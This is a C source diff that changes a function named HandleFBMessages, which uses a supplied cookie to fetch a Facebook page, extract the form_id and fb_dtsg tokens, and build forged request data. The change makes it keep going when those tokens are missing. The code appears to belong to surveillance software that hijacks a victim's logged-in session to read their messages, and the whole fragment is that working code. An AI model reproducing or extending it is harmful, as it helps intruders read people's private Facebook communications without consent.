@@ -165,32 +165,34 @@ DWORD HandleFBMessages(char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	parser1 = (BYTE *)strstr((char *)r_buffer, FB_POST_FORM_ID);
-	if (!parser1) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
+	if (parser1) {
+		parser1 += strlen(FB_POST_FORM_ID);
+		parser2 = (BYTE *)strchr((char *)parser1, '\"');
+		if (!parser2) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		*parser2=0;
+		_snprintf_s(form_id, sizeof(form_id), _TRUNCATE, "%s", parser1);
+		parser1 = parser2 + 1;
+	} else {
+		parser1 = r_buffer;
+		memset(form_id, 0, sizeof(form_id));
 	}
-	parser1 += strlen(FB_POST_FORM_ID);
-	parser2 = (BYTE *)strchr((char *)parser1, '\"');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	_snprintf_s(form_id, sizeof(form_id), _TRUNCATE, "%s", parser1);
-	parser1 = parser2 + 1;
+
 	parser1 = (BYTE *)strstr((char *)parser1, FB_DTSG_ID);
-	if (!parser1) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
+	if (parser1) {
+		parser1 += strlen(FB_DTSG_ID);
+		parser2 = (BYTE *)strchr((char *)parser1, '\"');
+		if (!parser2) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		*parser2=0;
+		_snprintf_s(dtsg_id, sizeof(dtsg_id), _TRUNCATE, "%s", parser1);
+	} else {
+		memset(dtsg_id, 0, sizeof(dtsg_id));
 	}
-	parser1 += strlen(FB_DTSG_ID);
-	parser2 = (BYTE *)strchr((char *)parser1, '\"');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	_snprintf_s(dtsg_id, sizeof(dtsg_id), _TRUNCATE, "%s", parser1);
 
 	SAFE_FREE(r_buffer);
 	_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "post_form_id=%s&fb_dtsg=%s&lsd&post_form_id_source=AsyncRequest&__user=%s&phstamp=145816710610967116112122", form_id, dtsg_id, user);
